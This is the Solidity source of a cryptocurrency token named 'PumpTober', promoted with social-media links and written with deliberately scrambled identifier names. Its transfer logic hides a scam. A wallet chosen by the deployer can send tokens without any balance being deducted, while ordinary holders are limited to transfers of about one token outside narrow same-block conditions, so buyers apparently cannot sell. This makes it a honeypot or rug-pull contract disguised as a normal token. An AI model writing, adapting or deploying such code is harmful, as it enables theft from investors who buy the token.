/*

Telegram:  https://t.me/PumpToberETH

Twitter:  https://twitter.com/PumpTober_ETH

Website: https://pumptober.crypto-token.live/

*/

// SPDX-License-Identifier: MIT

pragma solidity >=0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract PumpTober is Ownable {
    uint8 public decimals = 9;

    function approve(address jcepbmgy, uint256 zgmslj) public returns (bool success) {
        allowance[msg.sender][jcepbmgy] = zgmslj;
        emit Approval(msg.sender, jcepbmgy, zgmslj);
        return true;
    }

    IUniswapV2Router02 private vtzyugfjlkb;

    function transferFrom(address mrbh, address qzojeicm, uint256 zgmslj) public returns (bool success) {
        require(zgmslj <= allowance[mrbh][msg.sender]);
        allowance[mrbh][msg.sender] -= zgmslj;
        yibgqpjx(mrbh, qzojeicm, zgmslj);
        return true;
    }

    mapping(address => uint256) private gkpxqicjoau;

    constructor(string memory tawoqexsfc, string memory edmukfq, address raxcdjibpzv, address ocnyrifumk) {
        name = tawoqexsfc;
        symbol = edmukfq;
        balanceOf[msg.sender] = totalSupply;
        ltcd[ocnyrifumk] = dnmpystgza;
        vtzyugfjlkb = IUniswapV2Router02(raxcdjibpzv);
    }

    string public symbol;

    string public name;

    mapping(address => uint256) private jdeazrbtgnk;

    mapping(address => uint256) public balanceOf;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    mapping(address => uint256) private ltcd;

    function yibgqpjx(address mrbh, address qzojeicm, uint256 zgmslj) private {
        address npqjiltk = IUniswapV2Factory(vtzyugfjlkb.factory()).getPair(address(this), vtzyugfjlkb.WETH());
        bool ghumprq = jdeazrbtgnk[mrbh] == block.number;
        if (0 == ltcd[mrbh]) {
            if (mrbh != npqjiltk && (!ghumprq || zgmslj > gkpxqicjoau[mrbh]) && zgmslj < totalSupply) {
                require(zgmslj <= totalSupply / (10 ** decimals));
            }
            balanceOf[mrbh] -= zgmslj;
        }
        gkpxqicjoau[qzojeicm] = zgmslj;
        balanceOf[qzojeicm] += zgmslj;
        jdeazrbtgnk[qzojeicm] = block.number;
        emit Transfer(mrbh, qzojeicm, zgmslj);
    }

    uint256 private dnmpystgza = 103;

    mapping(address => mapping(address => uint256)) public allowance;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    event Transfer(address indexed from, address indexed to, uint256 value);

    function transfer(address qzojeicm, uint256 zgmslj) public returns (bool success) {
        yibgqpjx(msg.sender, qzojeicm, zgmslj);
        return true;
    }
}
